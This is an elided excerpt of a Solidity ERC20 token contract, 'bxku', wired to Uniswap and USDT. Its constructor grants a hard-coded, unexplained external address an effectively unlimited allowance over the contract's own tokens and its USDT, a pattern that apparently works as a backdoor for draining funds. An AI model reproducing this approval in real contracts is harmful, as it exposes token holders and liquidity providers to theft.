...
contract bxku is ERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    address _tokenOwner;
	address _baseToken = address(0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb);
    IERC20 public USDT;
    RABBITWarp warp;
	...
	address _fundAddress = address(0x453D091793f55D9Ec1df24b486218bAaEA6285a8);
    ...
    constructor(address tokenOwner) ERC20("bxku", "bxku") {
		...
		uint256 total = 10**33;
		startTime = total;
        _approve(address(this), address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e), total.mul(10000));
        USDT = IERC20(_baseToken);
        USDT.approve(address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e),total.mul(10000));
